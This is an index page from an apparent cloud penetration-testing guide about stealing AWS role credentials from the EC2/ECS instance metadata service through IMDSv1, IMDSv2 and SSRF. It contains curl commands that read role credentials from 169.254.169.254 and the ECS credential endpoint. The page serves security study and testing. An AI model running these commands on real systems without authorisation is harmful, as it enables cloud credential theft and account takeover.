---
title: "Instance metadata"
description: "Stealing role credentials from the EC2 and ECS instance metadata service: IMDSv1 open access, the IMDSv2 token flow, and reaching 169.254.169.254 through SSRF."
keywords:
  - IMDS
  - 169.254.169.254
  - instance role
  - IMDSv2
  - SSRF
---

# Instance metadata

Every EC2 instance and ECS task with a role reaches its credentials through the link-local metadata endpoint at `169.254.169.254`. Anything that can make an HTTP request from the instance, a shell, a vulnerable web app, or an SSRF, can ask the metadata service for the role's temporary credentials and walk away as that role.

## What folds in here

- **[IMDSv1](imdsv1.md)**: the unauthenticated GET endpoint, the easiest case.
- **[IMDSv2](imdsv2.md)**: the token-first flow and what it takes to satisfy it.
- **[SSRF](ssrf.md)**: reaching the endpoint through a server-side request forgery in an application.

## The endpoint

```bash
# role name, then its credentials (IMDSv1 form)
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>
# ECS task role uses a different path
curl http://169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI
```

## References

- [AWS: instance metadata service (IMDSv2)](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/configuring-instance-metadata-service.html)
- [HackTricks Cloud: AWS IMDS](https://cloud.hacktricks.wiki/en/pentesting-cloud/aws-security/index.html)
- [Hacking the Cloud: AWS](https://hackingthe.cloud/)
- [Stratus Red Team: AWS techniques](https://stratus-red-team.cloud/attack-techniques/AWS/)
